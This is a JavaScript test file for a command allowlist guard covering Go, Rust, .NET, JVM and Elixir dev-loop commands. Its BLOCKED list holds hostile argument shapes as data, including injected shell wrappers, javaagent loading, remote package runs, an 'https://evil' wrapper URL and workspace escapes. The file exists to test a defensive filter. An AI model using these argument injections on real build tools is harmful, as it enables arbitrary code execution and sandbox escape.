import { test } from "node:test";
import assert from "node:assert/strict";
import * as path from "node:path";
import { classifyCommand } from "../dist/security/command-guard.js";
import { DEFAULT_POLICY } from "../dist/policy/types.js";

const ws = path.resolve("/tmp/ws");
const verdict = (cmd, args) => classifyCommand(cmd, args, ".", ws, DEFAULT_POLICY.commandAllowlist).verdict;

// Normal dev-loop invocations that must keep working.
const SAFE = [
  ["go", ["run", "."]],
  ["go", ["run", "./cmd/api"]],
  ["go", ["run", "./..."]],
  ["go", ["run", "main.go", "--port", "8080"]],
  ["go", ["run", "-race", "-tags", "dev", "."]],
  ["go", ["run", "-ldflags", "-X main.version=dev -s -w", "."]],
  ["go", ["run", "-mod=mod", "."]],
  ["air", []],
  ["air", ["-c", ".air.toml"]],
  ["air", ["--", "-p", "8080"]],
  ["templ", ["generate", "--watch", "--proxy=http://localhost:8080", "--open-browser=false"]],
  ["wails", ["dev"]],
  ["wails", ["dev", "-browser"]],
  ["cargo", ["run"]],
  ["cargo", ["run", "--release", "--bin", "server", "--", "--port", "3000"]],
  ["cargo", ["+nightly", "run"]],
  ["cargo", ["run", "--manifest-path", "api/Cargo.toml"]],
  ["cargo", ["watch", "-x", "run"]],
  ["cargo", ["watch", "-w", "src", "-x", "run --release"]],
  ["cargo", ["watch", "--exec=run", "-c", "-q"]],
  ["cargo", ["leptos", "watch"]],
  ["trunk", ["serve"]],
  ["trunk", ["serve", "--port", "8080", "--open"]],
  ["dx", ["serve", "--platform", "web"]],
  ["dotnet", ["run"]],
  ["dotnet", ["run", "--launch-profile", "https", "-c", "Release"]],
  ["dotnet", ["run", "--project", "src/Web/Web.csproj", "--", "--urls", "http://localhost:5000"]],
  ["dotnet", ["watch", "run"]],
  ["dotnet", ["watch", "--project", "src/Web", "run"]],
  ["dotnet", ["watch"]],
  ["mvn", ["spring-boot:run"]],
  ["mvn", ["clean", "spring-boot:run", "-Dspring-boot.run.profiles=dev"]],
  ["mvn", ["spring-boot:run", "-Dspring-boot.run.arguments=--server.port=8081", "-DskipTests"]],
  ["mvn", ["quarkus:dev", "-Dquarkus.http.port=8081"]],
  ["mvn", ["-T", "4", "-pl", "web", "spring-boot:run"]],
  ["mvnw", ["spring-boot:run"]],
  ["./mvnw", ["spring-boot:run"]],
  ["gradle", ["bootRun"]],
  ["gradle", ["bootRun", "--args=--server.port=8081", "--console=plain"]],
  ["gradle", ["run", "--args", "--port 8080", "-x", "test"]],
  ["./gradlew", [":app:bootRun", "--continuous", "-i"]],
  ["gradlew", ["quarkusDev"]],
  ["mix", ["phx.server"]],
  ["mix", ["run", "--no-halt"]],
];

// Shapes that would run another program, remote code, or leave the workspace.
const BLOCKED = [
  // go
  ["go", ["build", "."]],
  ["go", ["generate", "./..."]],
  ["go", ["install", "example.com/x@latest"]],
  ["go", ["run", "example.com/x@latest"]],
  ["go", ["run", "github.com/evil/tool"]],
  ["go", ["run", "-exec", "sh", "."]],
  ["go", ["run", "-exec=sh", "."]],
  ["go", ["run", "-toolexec", "sh", "."]],
  ["go", ["run", "-C", "../..", "."]],
  ["go", ["run", "-overlay", "o.json", "."]],
  ["go", ["run", "-modfile=../go.mod", "."]],
  ["go", ["run", "-ldflags", "-extld=sh -linkmode=external", "."]],
  ["go", ["run", "-ldflags=-I /tmp/evil", "."]],
  ["go", ["run", "../other"]],
  ["go", ["run", "/abs/main.go"]],
  ["go", []],
  ["go", ["-C", "..", "run", "."]],
  // go helpers
  ["air", ["init"]],
  ["air", ["-build.cmd", "sh -c evil"]],
  ["air", ["--build.bin=evil"]],
  ["air", ["-c", "../elsewhere.toml"]],
  ["templ", ["generate", "--cmd", "sh -c evil"]],
  ["templ", ["fmt", "."]],
  ["wails", ["build"]],
  ["wails", ["dev", "-ldflags", "-extld=sh"]],
  ["wails", ["dev", "-compiler", "/tmp/evil-go"]],
  // rust
  ["cargo", ["install", "evil"]],
  ["cargo", ["build"]],
  ["cargo", ["publish"]],
  ["cargo", ["run", "--config", "build.rustc-wrapper='sh'"]],
  ["cargo", ["--config=build.rustc-wrapper='sh'", "run"]],
  ["cargo", ["-Zunstable-options", "run"]],
  ["cargo", ["-C", "..", "run"]],
  ["cargo", ["run", "--manifest-path", "../x/Cargo.toml"]],
  ["cargo", ["run", "--manifest-path=/etc/Cargo.toml"]],
  ["cargo", ["run", "--target-dir", "/tmp/t"]],
  ["cargo", ["watch", "-s", "sh -c evil"]],
  ["cargo", ["watch", "--shell", "evil"]],
  ["cargo", ["watch", "-x", "run", "--", "evil"]],
  ["cargo", ["watch", "-x", "install evil"]],
  ["cargo", ["watch", "-x", "evil"]],
  ["cargo", ["watch", "-x", "run --config build.rustc-wrapper=sh"]],
  ["cargo", ["watch", "-E", "RUSTC_WRAPPER=evil", "-x", "run"]],
  ["cargo", ["watch", "-cxevil"]],
  ["cargo", ["leptos", "end-to-end"]],
  ["cargo", ["leptos"]],
  ["cargo", []],
  ["trunk", ["build"]],
  ["trunk", ["serve", "--config", "../Trunk.toml"]],
  ["dx", ["bundle"]],
  ["dx", ["serve", "--cargo-args", "--config build.rustc-wrapper=sh"]],
  // .NET
  ["dotnet", ["build"]],
  ["dotnet", ["tool", "install", "evil"]],
  ["dotnet", ["new", "console"]],
  ["dotnet", ["run", "-p:RunCommand=sh"]],
  ["dotnet", ["run", "/p:RunArguments=-c evil"]],
  ["dotnet", ["run", "--property:RunCommand=sh"]],
  ["dotnet", ["watch", "msbuild", "/t:evil"]],
  ["dotnet", ["run", "--project", "../elsewhere/x.csproj"]],
  // JVM
  ["mvn", ["install"]],
  ["mvn", ["exec:java", "-Dexec.mainClass=Evil"]],
  ["mvn", ["org.codehaus.mojo:exec-maven-plugin:3.1.0:exec"]],
  ["mvn", ["spring-boot:run", "-Dspring-boot.run.jvmArguments=-javaagent:/tmp/a.jar"]],
  ["mvn", ["spring-boot:run", "-D", "spring-boot.run.jvmArguments=-agentlib:x"]],
  ["mvn", ["spring-boot:run", "-Dexec.executable=sh"]],
  ["mvn", ["spring-boot:run", "-s", "../settings.xml"]],
  ["mvn", ["spring-boot:run", "--settings=/tmp/s.xml"]],
  ["mvn", ["-f", "../pom.xml", "spring-boot:run"]],
  ["mvn", ["spring-boot:run", "-t", "/tmp/toolchains.xml"]],
  ["gradle", ["build"]],
  ["gradle", ["tasks", "--all"]],
  ["gradle", ["bootRun", "-I", "init.gradle"]],
  ["gradle", ["bootRun", "--init-script", "evil.gradle"]],
  ["gradle", ["bootRun", "-b", "../build.gradle"]],
  ["gradle", ["bootRun", "-p", "../other"]],
  ["gradle", ["bootRun", "--include-build", "../evil"]],
  ["gradle", ["bootRun", "-Dorg.gradle.jvmargs=-javaagent:/tmp/a.jar"]],
  ["gradle", ["bootRun", "-Dorg.gradle.java.home=/tmp/jdk"]],
  ["gradle", ["bootRun", "-PjvmArgs=-javaagent:x"]],
  ["./gradlew", ["wrapper", "--gradle-distribution-url", "https://evil"]],
  // elixir
  ["mix", ["run", "-e", "System.cmd(\"sh\", [])"]],
  ["mix", ["run", "--eval", "1"]],
  ["mix", ["run", "-r", "evil.exs"]],
  ["mix", ["eval", "1"]],
  ["mix", ["deps.get"]],
  ["mix", []],
];

test("normal Go/Rust/.NET/JVM/Elixir dev-loop commands stay allowlisted", () => {
  for (const [cmd, args] of SAFE) {
    assert.equal(verdict(cmd, args), "allowlisted", `${cmd} ${args.join(" ")}`);
  }
});

test("commands that run other programs, remote code or leave the workspace are not allowlisted", () => {
  for (const [cmd, args] of BLOCKED) {
    assert.equal(verdict(cmd, args), "outside", `${cmd} ${args.join(" ")}`);
  }
});

test("rejections carry an actionable reason", () => {
  const v = classifyCommand("cargo", ["watch", "-s", "x"], ".", ws, DEFAULT_POLICY.commandAllowlist);
  assert.equal(v.verdict, "outside");
  assert.match(v.reason, /cargo watch/);
  const g = classifyCommand("go", ["run", "example.com/x@latest"], ".", ws, DEFAULT_POLICY.commandAllowlist);
  assert.match(g.reason, /not a local package/);
});

test("Windows shims (.exe/.cmd/.bat) get the same rules", () => {
  assert.equal(verdict("go.exe", ["run", "."]), "allowlisted");
  assert.equal(verdict("go.exe", ["run", "-exec", "sh", "."]), "outside");
  assert.equal(verdict("mvnw.cmd", ["spring-boot:run"]), "allowlisted");
  assert.equal(verdict("gradlew.bat", ["bootRun", "-I", "x"]), "outside");
});

test("mvnw/gradlew with a path must resolve inside the workspace", () => {
  assert.equal(verdict("./mvnw", ["spring-boot:run"]), "allowlisted");
  assert.equal(verdict("./backend/gradlew", ["bootRun"]), "allowlisted");
  assert.equal(verdict("../../tmp/evil/mvnw", ["spring-boot:run"]), "outside");
  assert.equal(verdict("/opt/evil/gradlew", ["bootRun"]), "outside");
});

test("the toolchain launchers are in the default allowlist", () => {
  for (const c of ["go", "cargo", "trunk", "dx", "air", "templ", "wails", "dotnet", "mvn", "mvnw", "gradle", "gradlew", "mix"]) {
    assert.ok(DEFAULT_POLICY.commandAllowlist.includes(c), c);
  }
});
